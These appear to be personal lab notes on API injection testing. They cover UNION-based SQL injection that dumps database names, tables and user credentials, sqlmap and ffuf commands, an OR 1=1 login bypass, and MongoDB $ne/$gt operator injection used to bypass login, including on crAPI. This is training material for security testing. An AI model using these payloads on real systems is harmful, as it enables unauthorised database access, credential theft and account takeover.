
Service running on port 80

### SQL Injection

Manipulate SQL queries made to a database

Query : GET /v1/001.php?roast=3+or+1%3d1%23 HTTP/1.1

We have SQL injection here

Try to find number of columns using order by
Order by 5 gives error and order by 4 dosent so we have 4 columns

Query : GET /v1/001.php?roast=3+union+select+database(),user(),3,4+from+information_schema.tables%23 HTTP/1.1

Response : 
{"ID":"api_injection","name":"apiInjection@172.18.0.2","origin":"3","roast_level":"4"}]

So Database = api_injection
     User = apiInjection@172.18.0.2

Query : GET /v1/001.php?roast=3+union+select+database(),user(),table_name,4+from+information_schema.tables%23 HTTP/1.1

![[sqli1.png]]


We have a table named users

Query : GET /v1/001.php?roast=3+union+select+1,2,column_name,4+from+information_schema.columns%23 HTTP/1.1

![[sqli2.png]]

We have columns named username and password

Query : GET /v1/001.php?roast=3+union+select+1,username,password,4+from+users%23 HTTP/1.1


![[sqli3.png]]


So 

admin : iLikePasta
jeremy : jeremyspassword

We found username and passwords using manual exploitation

Using ffuf

```sh
ffuf -c -w /usr/share/wordlists/seclists/SecLists-master/Fuzzing/SQLi/Generic-SQLi.txt:FUZZ -request req.txt -request-proto http
```

SQLMap

```sh
sqlmap -r req.txt --batch --dbs mysql --ignore-code 401 
```

Found Database

api_injection

```sh
sqlmap -r req.txt --batch --dbs mysql --ignore-code 401 -D api_injection --tables
```

Tables : coffee and users

```sh
sqlmap -r req.txt --batch --dbs mysql --ignore-code 401 -D api_injection -T users --dump
```

And we get all the usernames and passwords


---

### SQL Injection Login bypass

{"username":"admin","password":"admin"}

Try to just put single quote to test for SQL injection
Then try to use payloads like OR 1=1#


---


### NoSQL Injection

MongoDB :

We can add columns on the fly, but they need not have a value all the time for every entry.
Some entries may have 10 attributes, some may only have 5, so its flexible since it allows this.

Typical login query might look something like

```sh
db.users.find({name:'username',password:'password'})
```

users is the name of collection/tables

For Injection attack we use JSON operator

$ne : not equal
So we can make the query like

```sh
db.users.find({name:'username',password:{'$ne':'0'}})
```

As long as we not put the correct password, we are fine, so no need to add the 0 as well

Request : GET /login?username=admin&password=asdfff HTTP/1.1

username and password being sent via URI, this in itself is a finding and should be reported

Request : GET /login?username=admin&password\[\$ne]=asdfff HTTP/1.1
***JSON equivalent = {"username":"admin","password":{"$ne":"asdfff"}}***

And we get successful login


---

### Challenge

in crAPI

Add coupon feature

```sh
ffuf -c -w /usr/share/wordlists/seclists/SecLists-master/Fuzzing/SQLi/Generic-SQLi.txt:FUZZ -request sqliChallenge.txt -request-proto http
```

SQL injection not present

Try for NoSQL Injection

```sh
ffuf -c -w /usr/share/wordlists/seclists/SecLists-master/Fuzzing/Databases/NoSQL.txt:FUZZ -request sqliChallenge.txt -request-proto http
```

    * FUZZ: {"$gt": ""}
Gets status 200

![[challenge.png]]

